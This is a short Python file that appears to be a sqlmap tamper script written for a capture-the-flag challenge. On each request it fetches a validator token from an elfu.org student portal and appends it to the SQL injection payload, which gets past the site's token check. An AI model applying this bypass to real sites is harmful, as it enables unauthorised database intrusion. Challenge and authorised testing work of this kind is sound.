#!/usr/bin/env python

from lib.core.data import kb
from lib.core.enums import PRIORITY

import requests
import urllib

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    retVal = payload
    r = requests.get('https://studentportal.elfu.org/validator.php')
    token = 'token=' + urllib.quote_plus(r.text)
    retVal = retVal+'&'+token
    return retVal